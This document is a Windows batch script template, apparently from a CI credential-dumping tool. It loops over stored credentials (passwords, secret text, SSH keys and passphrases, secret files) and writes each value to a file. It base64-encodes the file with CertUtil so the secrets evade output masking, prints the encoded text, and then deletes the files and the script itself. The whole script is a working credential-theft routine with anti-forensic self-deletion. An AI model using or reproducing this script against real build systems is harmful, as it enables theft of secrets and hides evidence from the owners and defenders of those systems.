@echo off
ECHO @{barrier} >> "@{file_name}"
#for @cred in @credentials:
ECHO @{cred.type} >> "@{file_name}"
ECHO @{cred.description} >> "@{file_name}"
#if(@{cred.type} == "PASSWORD" || @{cred.type} == "SECRETTEXT")
ECHO %@{cred.variable}% >> "@{file_name}"
#elseif(@{cred.type} == "SSHKEY")
ECHO %@{cred.username_variable}% >> "@{file_name}"
ECHO %@{cred.passphrase_variable}% >> "@{file_name}"
TYPE %@{cred.key_file_variable}% >> "@{file_name}"
#elseif(@{cred.type} == "SECRETFILE")
TYPE %@{cred.variable}% >> "@{file_name}"
#end
ECHO @{barrier} >> "@{file_name}"
#end

CertUtil -encode "@{file_name}" "@{file_name}.b64" >NUL 2>NUL
TYPE "@{file_name}.b64"

DEL /Q "@{file_name}" >NUL 2>NUL
DEL /Q "@{file_name}.b64" >NUL 2>NUL
DEL /Q "%~f0" >NUL 2>NUL